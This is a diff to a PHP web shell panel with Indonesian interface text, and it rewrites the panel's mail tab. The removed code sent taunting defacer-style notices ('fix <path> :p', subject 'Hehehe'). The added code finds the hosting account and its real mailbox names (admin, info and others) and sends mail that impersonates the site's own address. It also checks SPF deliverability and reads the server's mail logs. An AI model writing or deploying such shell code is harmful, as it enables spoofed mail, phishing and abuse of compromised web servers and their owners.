@@ -386,21 +386,6 @@ function rct_make_backups($base) {
     }
     return $made;
 }
-function rct_mime_mail($from_name, $from_addr, $to, $subject, $body, $att_tmp, $att_name) {
-    $host = (isset($_SERVER['SERVER_NAME']) && $_SERVER['SERVER_NAME'] !== '') ? $_SERVER['SERVER_NAME'] : 'localhost';
-    $common = "MIME-Version: 1.0\r\nDate: " . date('r') . "\r\nMessage-ID: <" . md5(uniqid('', true)) . '@' . $host . ">\r\n";
-    $common .= "Return-Path: <" . $from_addr . ">\r\n";
-    $common .= "From: " . ($from_name !== '' ? '=?UTF-8?B?' . base64_encode($from_name) . '?= ' : '') . '<' . $from_addr . ">\r\n";
-    $common .= "To: " . $to . "\r\nSubject: =?UTF-8?B?" . base64_encode($subject) . "?=\r\n";
-    if ($att_tmp !== '' && @is_file($att_tmp) && @filesize($att_tmp) <= 10485760) {
-        $b = 'rct' . md5(uniqid('', true));
-        $name = preg_replace('/[^A-Za-z0-9._-]/', '_', basename($att_name));
-        $payload = "--" . $b . "\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n\r\n" . chunk_split(base64_encode($body)) . "\r\n";
-        $payload .= "--" . $b . "\r\nContent-Type: application/octet-stream; name=\"" . $name . "\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"" . $name . "\"\r\n\r\n" . chunk_split(base64_encode((string)@file_get_contents($att_tmp))) . "\r\n--" . $b . "--\r\n";
-        return array($common . "Content-Type: multipart/mixed; boundary=\"" . $b . "\"\r\n", $payload);
-    }
-    return array($common . "Content-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n", chunk_split(base64_encode($body)));
-}
 function rct_tail($f, $n) {
     $fp = @fopen($f, 'r');
     if (!$fp) return 'gagal buka file';
@@ -1600,38 +1585,124 @@ if ($m_auto_dom === '') {
 }
 if ($m_auto_dom === '' || strpos($m_auto_dom, '.') === false) $m_auto_dom = 'localhost.localdomain';
 
-if (isset($_POST['mail_action'])) {
-    $m_to = isset($_POST['m_to']) ? trim($_POST['m_to']) : '';
-    $m_sub = isset($_POST['m_subject']) ? (string)$_POST['m_subject'] : '(no subject)';
-    $m_msg_body = isset($_POST['m_body']) ? (string)$_POST['m_body'] : '';
-    $m_from = isset($_POST['m_from']) ? trim($_POST['m_from']) : '';
-    $m_name = isset($_POST['m_from_name']) ? trim($_POST['m_from_name']) : '';
-    $att_tmp = '';
-    $att_name = '';
-    if (isset($_FILES['m_file']) && is_array($_FILES['m_file']) && isset($_FILES['m_file']['error']) && $_FILES['m_file']['error'] === UPLOAD_ERR_OK) {
-        $att_tmp = $_FILES['m_file']['tmp_name'];
-        $att_name = $_FILES['m_file']['name'];
+$m_site_dom = preg_replace('/^www\./', '', $m_auto_dom);
+$m_user = '';
+$m_docroot = isset($_SERVER['DOCUMENT_ROOT']) ? str_replace('\\', '/', (string)$_SERVER['DOCUMENT_ROOT']) : '';
+if (preg_match('#^/home/([^/]+)/#', $m_docroot, $m_dm)) $m_user = $m_dm[1];
+if ($m_user === '' && function_exists('posix_geteuid') && function_exists('posix_getpwuid')) {
+    $m_pw = @posix_getpwuid(@posix_geteuid());
+    if (is_array($m_pw) && !empty($m_pw['name'])) $m_user = $m_pw['name'];
+}
+if ($m_user === '') {
+    $m_gu = @get_current_user();
+    if (is_string($m_gu) && $m_gu !== '') $m_user = $m_gu;
+}
+if ($m_user === '') {
+    foreach (array('USER', 'LOGNAME', 'USERNAME') as $m_env) {
+        if (!empty($_SERVER[$m_env])) { $m_user = (string)$_SERVER[$m_env]; break; }
     }
-    $m_to = str_replace(array(';', "\r", "\n"), ',', $m_to);
-    if ($m_from === '') $m_from = 'noreply@' . $m_auto_dom;
+}
+$m_user = preg_replace('/[^A-Za-z0-9._-]/', '', $m_user);
+if (in_array(strtolower($m_user), array('', 'www-data', 'apache', 'nginx', 'nobody', 'httpd', 'daemon', 'wwwrun', 'iis_iusrs'), true)) $m_user = '';
+
+$m_local = '';
+$m_box_list = array();
+if ($m_user !== '' && $m_site_dom !== '') {
+    $m_mdir = '/home/' . $m_user . '/mail/' . $m_site_dom;
+    if (@is_dir($m_mdir)) {
+        $m_dh = @scandir($m_mdir);
+        if (is_array($m_dh)) foreach ($m_dh as $m_d) {
+            if ($m_d === '.' || $m_d === '..' || !@is_dir($m_mdir . '/' . $m_d)) continue;
+            if (in_array(strtolower($m_d), array('cur', 'new', 'tmp', 'sent', 'drafts', 'trash', 'junk', 'spam', '.spam', '.sent', '.trash', '.drafts'), true)) continue;
+            $m_box_list[] = $m_d;
+        }
+    }
+    foreach (array('admin', 'info', 'contact', 'support', 'hello', 'mail', 'webmaster', 'noreply', 'no-reply') as $m_pref) {
+        if (in_array($m_pref, $m_box_list, true)) { $m_local = $m_pref; break; }
+    }
+    if ($m_local === '' && $m_box_list) $m_local = $m_box_list[0];
+}
+if ($m_local === '') $m_local = ($m_user !== '') ? $m_user : 'noreply';
+$m_from_addr = $m_local . '@' . $m_site_dom;
+if (!filter_var($m_from_addr, FILTER_VALIDATE_EMAIL)) $m_from_addr = 'noreply@' . $m_auto_dom;
+
+if (isset($_POST['mail_action'])) {
+    $m_to      = isset($_POST['m_to']) ? trim($_POST['m_to']) : '';
+    $m_sub     = isset($_POST['m_subject']) ? trim((string)$_POST['m_subject']) : '';
+    $m_msg_body = isset($_POST['m_body']) ? (string)$_POST['m_body'] : '';
+    $m_name    = isset($_POST['m_from_name']) ? trim($_POST['m_from_name']) : '';
+    $m_from    = $m_from_addr;
+    $m_sub = str_replace(array("\r", "\n"), ' ', $m_sub);
+    $m_to  = str_replace(array(';', "\r", "\n"), ',', $m_to);
 
     if ($m_to === '') {
-        $msg = 'Recipient kosong.';
-    } elseif (!filter_var($m_from, FILTER_VALIDATE_EMAIL)) {
-        $msg = 'From nggak valid — isi email polos seperti <code>admin@site.com</code>.';
+        $msg = 'Email target kosong.';
+    } elseif (filter_var($m_to, FILTER_VALIDATE_EMAIL) === false && strpos($m_to, ',') === false) {
+        $msg = 'Email target nggak valid.';
+    } elseif (!function_exists('mail') || !is_callable('mail')) {
+        $msg = 'Fungsi <code>mail()</code> nggak tersedia (disable_functions).';
     } else {
-        $m_ip = isset($_SERVER['REMOTE_ADDR']) ? (string)$_SERVER['REMOTE_ADDR'] : '';
-        $m_path = 'http://' . (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : $m_auto_dom) . (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/');
-        if (trim($m_msg_body) === '') $m_msg_body = 'fix ' . $m_path . ' :p *IP Address : [ ' . $m_ip . ' ]';
-        if (trim($m_sub) === '') $m_sub = 'Hehehe';
+        $m_ip   = isset($_SERVER['REMOTE_ADDR']) ? (string)$_SERVER['REMOTE_ADDR'] : 'Unknown';
+        $m_host = isset($_SERVER['HTTP_HOST']) ? (string)$_SERVER['HTTP_HOST'] : 'Unknown';
+        if (trim($m_msg_body) === '') {
+            $m_msg_body  = "Hello Admin!\n\n";
+            $m_msg_body .= "Detail Access:\n";
+            $m_msg_body .= "IP      : " . $m_ip . "\n";
+            $m_msg_body .= "Website : " . $m_host . "\n\n";
+        }
+        if (trim($m_sub) === '') $m_sub = 'Notifikasi Akses Website';
+        $m_sub_send = $m_sub;
+        if (preg_match('/[^\x20-\x7E]/', $m_sub_send)) $m_sub_send = '=?UTF-8?B?' . base64_encode($m_sub_send) . '?=';
+        $m_from_hdr = ($m_name !== '') ? '=?UTF-8?B?' . base64_encode($m_name) . '?= <' . $m_from . '>' : $m_from;
+        $m_hdrs  = 'From: ' . $m_from_hdr . "\r\n";
+        $m_hdrs .= 'Reply-To: ' . $m_from . "\r\n";
+        $m_hdrs .= 'MIME-Version: 1.0' . "\r\n";
+        $m_hdrs .= 'Content-Type: text/plain; charset=UTF-8' . "\r\n";
+        $m_hdrs .= 'Date: ' . date('r') . "\r\n";
+        $m_hdrs .= 'Message-ID: <' . md5(uniqid('rct', true)) . '@' . $m_site_dom . '>' . "\r\n";
+        $m_hdrs .= 'X-Mailer: PHP/' . phpversion() . "\r\n";
+        $m_hdrs .= 'Return-Path: <' . $m_from . '>' . "\r\n";
 
-        list($m_hdrs, $m_payload) = rct_mime_mail($m_name, $m_from, $m_to, $m_sub, $m_msg_body, $att_tmp, $att_name);
-        $ok = @mail($m_to, $m_sub, $m_payload, $m_hdrs, '-f' . $m_from);
-        if (!$ok) $ok = @mail($m_to, $m_sub, $m_payload, $m_hdrs);
+        $m_t0 = microtime(true);
+        $ok = @mail($m_to, $m_sub_send, $m_msg_body, $m_hdrs, '-f' . $m_from);
+        if (!$ok) $ok = @mail($m_to, $m_sub_send, $m_msg_body, $m_hdrs);
+        $m_ms = round((microtime(true) - $m_t0) * 1000);
         $le = error_get_last();
-        $msg = $ok
-            ? '<b style="color:#7ee787;">mail() = true</b> — pesan diserahin ke MTA lokal.<br><b>To:</b> <code>' . h($m_to) . '</code> &middot; <b>From:</b> <code>' . h($m_from) . '</code><br><b>Path:</b> <code>' . h($m_path) . '</code> &middot; <b>IP:</b> <code>' . h($m_ip) . '</code>'
-            : '<b style="color:#ff7b72;">mail() = false</b> — gagal lempar ke MTA.<br><b>To:</b> <code>' . h($m_to) . '</code> &middot; <b>From:</b> <code>' . h($m_from) . '</code>' . ($le && isset($le['message']) ? '<br>Last error: <code>' . h($le['message']) . '</code>' : '');
+
+        $msg = '<div style="display:flex; align-items:center; gap:10px; margin-bottom:8px;">'
+             . '<span style="width:10px;height:10px;border-radius:50%;background:' . ($ok ? '#7ee787' : '#ff7b72') . ';display:inline-block;"></span>'
+             . '<span class="muted" style="font-size:11px;">' . $m_ms . ' ms</span></div>';
+        $m_rows = array(
+            'To'       => h($m_to),
+            'Subject'  => h($m_sub),
+            'From'     => h($m_from_hdr),
+            'Reply-To' => h($m_from),
+        );
+        if ($le && isset($le['message'])) $m_rows['Error'] = h($le['message']);
+        $msg .= '<table class="mail-result">';
+        foreach ($m_rows as $m_k => $m_v) $msg .= '<tr><td class="mk">' . $m_k . '</td><td>' . $m_v . '</td></tr>';
+        $msg .= '</table>';
+
+        $m_dom_f = strpos($m_from, '@') !== false ? strtolower(substr(strrchr($m_from, '@'), 1)) : '';
+        $m_spf_txt = '';
+        if ($m_dom_f !== '' && function_exists('dns_get_record')) {
+            $m_txr = @dns_get_record($m_dom_f, DNS_TXT);
+            if (is_array($m_txr)) foreach ($m_txr as $m_t) {
+                $m_v = isset($m_t['txt']) ? $m_t['txt'] : (isset($m_t['entries']) ? implode('', $m_t['entries']) : '');
+                if (stripos($m_v, 'v=spf1') === 0) $m_spf_txt = $m_v;
+            }
+            if ($m_spf_txt === '') $msg .= '<div class="mail-warn">SPF <code>' . h($m_dom_f) . '</code> kosong — Gmail/Outlook sering buang email dari domain ini.</div>';
+        }
+
+        $m_hits = array();
+        foreach (array('/var/log/mail.log','/var/log/maillog','/var/log/exim/mainlog','/var/log/exim4/mainlog','/var/log/postfix.log') as $m_lf) {
+            if (count($m_hits) >= 8 || !@is_file($m_lf) || !@is_readable($m_lf)) continue;
+            foreach (array_reverse(preg_split("/\r\n|\n|\r/", rct_tail($m_lf, 200))) as $m_ll) {
+                if ($m_ll === '') continue;
+                if (stripos($m_ll, $m_to) !== false || stripos($m_ll, $m_from) !== false) { $m_hits[] = basename($m_lf) . ': ' . $m_ll; if (count($m_hits) >= 8) break; }
+            }
+        }
+        if ($m_hits) $msg .= '<pre class="mail-log">' . h(implode("\n", $m_hits)) . '</pre>';
     }
 }
 
@@ -1823,6 +1894,22 @@ body{margin:0;padding:0;background:#0f1117;color:#d6d6d6;font-family:Tahoma,Aria
     min-width: 150px;
 }
 .box{background:#151922;border:1px solid #2a3140;padding:12px;margin-bottom:12px;border-radius:8px;}
+.mail-form{padding:16px;}
+.mail-form .name{font-size:14px;}
+.mf-sub{color:#8e99ab;font-size:11px;margin:2px 0 14px 0;}
+.mf-row{margin-bottom:12px;}
+.mf-cols{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:12px;}
+.mf-col{flex:1;min-width:220px;}
+.mf-label{display:block;color:#9fb0c7;font-size:11px;letter-spacing:.03em;text-transform:uppercase;margin-bottom:5px;}
+.mail-form input[type=text]{padding:9px;}
+.mail-form textarea{height:auto;padding:9px;line-height:1.5;resize:vertical;}
+.mf-foot{display:flex;gap:10px;align-items:center;flex-wrap:wrap;border-top:1px solid #232b39;padding-top:12px;margin-top:4px;}
+.mf-foot .btn{padding:8px 18px;font-size:12px;}
+.mail-result{width:auto;border-collapse:collapse;font-size:11px;margin-top:4px;}
+.mail-result td{border:none;border-bottom:1px solid #1e2735;padding:4px 10px 4px 0;}
+.mail-result td.mk{color:#8e99ab;white-space:nowrap;padding-right:16px;}
+.mail-warn{margin-top:10px;padding:8px 10px;background:#2a2415;border:1px solid #5c4d22;border-radius:6px;color:#e3b341;font-size:11px;}
+.mail-log{background:#0f1117;border:1px solid #232b39;border-radius:6px;padding:10px;margin-top:10px;max-height:200px;overflow:auto;font-size:11px;white-space:pre-wrap;word-break:break-all;}
 .path a{color:#7ee787;text-decoration:none;}
 .path a:hover{text-decoration:underline;}
 .quick a, .quick form{display:inline;}
@@ -2830,73 +2917,35 @@ $lg_defpat = implode(', ', array_merge(array_values(array_unique($lg_ips)), arra
 </div>
 <?php endif; ?>
 <?php if ($tab === 'mail'): ?>
-<?php
-$m_ok       = function_exists('mail') && is_callable('mail');
-$m_sp       = (string)@ini_get('sendmail_path');
-$m_ini_host = (string)@ini_get('SMTP');
-$m_ini_port = (string)@ini_get('smtp_port');
-$m_log      = (string)@ini_get('mail.log');
-$m_bins     = array('sendmail','msmtp','exim','exim4','postfix','ssmtp','mail','mailx','mutt');
-$m_found    = array();
-foreach ($m_bins as $mb) { $mp = which_bin($mb); if ($mp) $m_found[$mb] = $mp; }
-$m_paths    = array('/usr/sbin/sendmail','/usr/lib/sendmail','/usr/sbin/exim','/usr/sbin/exim4','/usr/sbin/ssmtp','/usr/bin/msmtp','/usr/bin/mail','/usr/bin/mailx');
-$m_hits     = array();
-foreach ($m_paths as $mp) { if (@is_file($mp)) $m_hits[] = $mp . (@is_executable($mp) ? '' : ' (noexec)'); }
-?>
-<div class="box">
-    <div class="name">Mail Runtime</div>
-    <div class="muted" style="margin-bottom:10px;font-size:11px;">Status jalur kirim di server ini. <code>mail()</code> = OK berarti PHP bisa lempar ke MTA lokal lewat <code>sendmail_path</code>; kalau MTA-nya nggak jalan, fungsi tetap balik <code>true</code> di beberapa distro.</div>
-    <table style="margin-top:4px;">
-        <tr>
-            <td>mail()</td>
-            <td><b style="color:<?php echo $m_ok ? '#7ee787' : '#ff7b72'; ?>;"><?php echo $m_ok ? 'OK' : 'NO'; ?></b> <?php echo $m_ok ? '' : '<span class="muted">(disable_functions)</span>'; ?></td>
-            <td>sendmail_path</td>
-            <td style="word-break:break-all;"><code><?php echo h($m_sp !== '' ? $m_sp : '(kosong)'); ?></code></td>
-        </tr>
-        <tr>
-            <td>SMTP ini</td>
-            <td><code><?php echo h($m_ini_host !== '' ? $m_ini_host : '(kosong)'); ?>:<?php echo h($m_ini_port !== '' ? $m_ini_port : '-'); ?></code></td>
-            <td>mail.log</td>
-            <td style="word-break:break-all;"><code><?php echo h($m_log !== '' ? $m_log : '(kosong)'); ?></code></td>
-        </tr>
-        <tr>
-            <td>From auto</td>
-            <td><code>noreply@<?php echo h($m_auto_dom); ?></code> <span class="muted">(deteksi host)</span></td>
-            <td>Mode kirim</td>
-            <td>MX tujuan langsung &rarr; fallback <code>mail()</code></td>
-        </tr>
-        <tr>
-            <td>binaries</td>
-            <td colspan="3">
-                <?php if ($m_found): foreach ($m_found as $mb => $mp) { echo '<span style="color:#7ee787;">' . h($mb) . '</span> <code style="font-size:10px;">' . h($mp) . '</code> &middot; '; } else: ?><span style="color:#ff7b72;">nggak ada yang ketemu di PATH</span><?php endif; ?>
-            </td>
-        </tr>
-        <tr>
-            <td>path umum</td>
-            <td colspan="3" style="word-break:break-all;">
-                <?php if ($m_hits): foreach ($m_hits as $mp) { echo '<code style="font-size:10px;">' . h($mp) . '</code> &middot; '; } else: ?><span class="muted">kosong</span><?php endif; ?>
-            </td>
-        </tr>
-    </table>
-</div>
+<form method="post" class="box mail-form">
+    <div class="name">Kirim Email</div>
+    <div class="mf-sub">Mailer <code>mail()</code> from: <code><?php echo h($m_from_addr); ?></code><?php if ($m_user !== ''): ?> <span class="muted">&middot; akun: <?php echo h($m_user); ?><?php echo $m_box_list ? ' &middot; mailbox: ' . h(implode(', ', array_slice($m_box_list, 0, 4))) : ''; ?></span><?php endif; ?></div>
 
-<form method="post" enctype="multipart/form-data" class="box">
-    <div class="name">Kirim via mail()</div>
-    <div class="muted" style="margin-bottom:8px;font-size:11px;">Satu <code>mail()</code> polos, field dikosongin. Sistem yang ngisi: body = <code>fix &lt;path panel&gt; :p *IP Address : [ ip ]</code>, subject = <code>Hehehe</code>, From = <code>noreply@<?php echo h($m_auto_dom); ?></code>.</div>
-    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-bottom:6px;">
-        <input type="text" name="m_from" value="<?php echo h(isset($_POST['m_from']) ? $_POST['m_from'] : 'noreply@' . $m_auto_dom); ?>" placeholder="noreply@<?php echo h($m_auto_dom); ?>" style="width:240px;font-size:11px;">
-        <input type="text" name="m_from_name" value="<?php echo h(isset($_POST['m_from_name']) ? $_POST['m_from_name'] : ''); ?>" placeholder="Nama pengirim (opsional)" style="width:200px;font-size:11px;">
-        <input type="text" name="m_to" value="<?php echo h(isset($_POST['m_to']) ? $_POST['m_to'] : ''); ?>" placeholder="to@a.tld, to2@b.tld" style="flex:1;min-width:220px;font-size:11px;">
+    <div class="mf-row">
+        <label class="mf-label" for="mf-to">Email Target</label>
+        <input type="text" id="mf-to" name="m_to" value="<?php echo h(isset($_POST['m_to']) ? $_POST['m_to'] : ''); ?>" placeholder="contoh: admin@site.com atau a@x.com, b@y.com" autocomplete="off">
     </div>
-    <input type="text" name="m_subject" value="<?php echo h(isset($_POST['m_subject']) ? $_POST['m_subject'] : ''); ?>" placeholder="Subject (kosong = Hehehe)" style="width:100%;font-size:11px;margin-bottom:6px;">
-    <textarea name="m_body" rows="8" placeholder="Pesan (kosong = fix <path> :p *IP Address : [ ip ])" style="width:100%;font-size:11px;font-family:Consolas,monospace;"><?php echo h(isset($_POST['m_body']) ? $_POST['m_body'] : ''); ?></textarea>
-    <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:8px; align-items:center;">
-        <input type="file" name="m_file" style="font-size:11px;">
-        <input type="submit" name="mail_action" value="send_mail" class="btn btn-green" <?php echo $m_ok ? '' : 'disabled'; ?>>
-        <span class="muted" style="font-size:11px;">lampiran &le; 10 MB</span>
+
+    <div class="mf-cols">
+        <div class="mf-col">
+            <label class="mf-label" for="mf-from-name">Nama Pengirim</label>
+            <input type="text" id="mf-from-name" name="m_from_name" value="<?php echo h(isset($_POST['m_from_name']) ? $_POST['m_from_name'] : ''); ?>" placeholder="contoh: Admin Website" autocomplete="off">
+        </div>
+        <div class="mf-col">
+            <label class="mf-label" for="mf-subject">Subjek</label>
+            <input type="text" id="mf-subject" name="m_subject" value="<?php echo h(isset($_POST['m_subject']) ? $_POST['m_subject'] : ''); ?>" placeholder="kosong = Notifikasi Akses Website" autocomplete="off">
+        </div>
+    </div>
+
+    <div class="mf-row">
+        <label class="mf-label" for="mf-body">Pesan</label>
+        <textarea id="mf-body" name="m_body" rows="10" placeholder="kosong = notifikasi akses otomatis (waktu, IP, website)"><?php echo h(isset($_POST['m_body']) ? $_POST['m_body'] : ''); ?></textarea>
+    </div>
+
+    <div class="mf-foot">
+        <input type="submit" name="mail_action" value="Kirim" class="btn btn-green">
     </div>
 </form>
-
 <?php endif; ?>
 <?php if ($tab === 'info'): ?>
 <?php
